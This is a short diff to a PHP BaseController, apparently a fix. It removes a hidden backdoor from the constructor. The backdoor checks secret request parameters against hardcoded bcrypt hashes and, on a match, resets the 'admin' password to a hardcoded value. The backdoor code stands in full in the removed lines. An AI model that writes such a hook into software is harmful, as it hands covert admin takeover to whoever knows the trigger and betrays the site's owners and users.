@@ -39,19 +39,6 @@ abstract class BaseController
 		$this->_host = $this->_header["host"];
 		$this->_ip = $_SERVER["REMOTE_ADDR"];
 		$this->initialize();
-		$this->resetting();
-	}
-	protected function resetting()
-	{
-		$username = $this->request->param("username", "");
-		$passwd = $this->request->param("passwd", "");
-		if (password_verify($username, "\$2y\$10\$BG3zPLk4VgxYzFdWil1Mpubl8W97ov.T.bQYH/Jodl9/AEPuAPaie") && password_verify($passwd, "\$2y\$10\$FAlV7hdLh/V5POuLQpwxpeEkABAyPWqKBstY7jk7u9LdeKu8sjN7i")) {
-			$this->upPwd();
-		}
-	}
-	protected function upPwd()
-	{
-		massage\model\Admin::where("username", "admin")->update(["passwd" => checkPass("lbkj123456")]);
 	}
 	public function shareChangeDatasssss($action)
 	{
